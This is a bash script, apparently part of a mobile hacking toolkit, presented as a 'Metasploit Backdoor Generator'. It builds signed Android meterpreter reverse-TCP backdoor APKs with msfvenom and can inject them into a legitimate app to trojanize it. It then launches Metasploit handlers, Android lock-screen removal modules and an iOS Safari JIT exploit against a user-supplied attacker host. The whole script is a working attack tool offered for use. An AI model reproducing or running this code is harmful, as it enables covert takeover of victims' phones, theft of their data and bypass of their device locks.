#!/usr/bin/env bash

metasploit() {
    clear
    function mmeta() {
        banner
        echo -e "   Metasploit Backdoor Generator"
    }
    mmeta
    echo -e "
1.Install Application
2.Create Payload Backdoor {Msfvenom} Singed
3.Run Metasploit
4.Inject Payload In Original Application
99.Menu
"
    read -p "senpai@tegalsec:~# " select
    if [[ $select == 1 ]]; then
        read -p "Enter Ur Application: " app
        read -p "Run Application {Y/N}: " run
        if [ "$run" == "Y" ] || [ "$run" == "y" ]; then
            read -p "Enter Package Application Name: " pkg
            adb install "$app"
            adb shell am start "$pkg"/.unlock
        else
            adb install "$app"
        fi

    elif [[ $select == 2 ]]; then
        path="backdoor"
        loli="loli.apk"
        read -p "Enter LHOST: " host
        read -p "Enter LPORT: " port
        read -p "Application Name: " app
        paths=$path/$loli
        echo -e "Wait Creating Backdoor..."
        msfvenom -p android/meterpreter/reverse_tcp lhost="$host" lport="$port" R >$paths
        echo "Wait Installing Keystore..."
        sleep 5
        keytool -genkey -V -keystore $path/key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $path/key.keystore $paths hacked
        jarsigner -verify -verbose -certs $paths
        zipalign -v 4 $paths $path'/'"$app"'.apk'
        milf=$path/$app'.apk'
        rm $paths
        rm $path/key.keystore
        echo "Your Backdoor Created In" "$milf"
    elif [[ $select == 3 ]]; then
        clear
        mmeta
        payload='android/meterpreter/reverse_tcp'
        payload2='osx/armle/execute/reverse_tcp'
        echo -e "
  Payload {Android} => $payload
  Payload (iOS) => $payload2
  Listener
  1.Multi Handler {Default}
  2.Remove Lock
  3.Remove Lock {Root}
  4.Safari Jit {iOS < 7.1.2}
"
        read -p "senpai@tegalsec:~# " select
        if [[ $select == 1 ]]; then
            read -p "LHOST: " host
            read -p "LPORT: " port
            msfconsole=msfconsole
            exploit='use exploit/multi/handler'
            xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"

        elif [[ $select == 2 ]]; then
            read -p "LHOST: " host
            read -p "LPORT: " port
            msfconsole=msfconsole
            exploit='use post/android/manage/remove_lock'
            xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"

        elif [[ $select == 3 ]]; then
            read -p "LHOST: " host
            read -p "LPORT: " port
            msfconsole=msfconsole
            exploit='use post/android/manage/remove_lock_root'
            xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"

        elif [[ $select == 4 ]]; then
            read -p "LHOST: " host
            read -p "LPORT: " port
            msfconsole=msfconsole
            exploit='use exploit/apple_ios/browser/safari_jit'
            xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload2 ; set lhost $host ; set lport $port; exploit; exit -y'"
        fi

    elif [[ $select == 4 ]]; then
        path="backdoor"
        loli="loli.apk"
        read -p "Enter LHOST: " host
        read -p "Enter LPORT: " port
        read -p "Enter Original Application: " ori
        read -p "Application Name: " app
        paths=$path/$loli
        echo -e "Wait Creating Backdoor..."
        msfvenom --platform android -x "$ori" -p android/meterpreter/reverse_tcp lhost="$host" lport="$port" -o $paths

        # if error,uncomment it

        # echo "Wait Installing Keystore..."
        # sleep 5
        # keytool -genkey -V -keystore $path/key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
        # jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $path/key.keystore $paths hacked
        # jarsigner -verify -verbose -certs $paths
        # zipalign -v 4 $paths $path'/'$app'.apk'
        milf=$path/$app'.apk'
        rm $paths
        # rm $path/key.keystore
        echo "Your Backdoor Created In" "$milf"
    elif [[ $select == 99 ]]; then
        files
    fi

}
